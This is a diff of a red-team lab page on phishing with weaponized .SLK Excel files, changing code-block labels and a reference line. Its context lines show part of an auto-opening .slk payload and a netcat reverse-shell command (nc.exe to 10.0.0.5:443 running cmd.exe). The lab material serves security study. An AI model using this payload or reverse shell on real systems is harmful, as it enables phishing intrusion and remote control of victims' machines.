@@ -1,6 +1,6 @@
 # Phishing: .SLK Excel
 
-This lab is based on findings by [@StanHacked](https://twitter.com/StanHacked)
+This lab is based on findings by [@StanHacked](https://twitter.com/StanHacked) - see below references for more info.
 
 ## Weaponization
 
@@ -8,7 +8,7 @@ Create an new text file, put the the below code and save it as .slk file:
 
 {% code-tabs %}
 {% code-tabs-item title="demo.slk" %}
-```text
+```csharp
 ID;P
 O;E
 NN;NAuto_open;ER101C1;KOut Flank;F
@@ -25,7 +25,7 @@ Note that the shell.cmd refers to a simple nc reverse shell batch file:
 
 {% code-tabs %}
 {% code-tabs-item title="c:\\shell.cmd" %}
-```text
+```csharp
 C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
 ```
 {% endcode-tabs-item %}
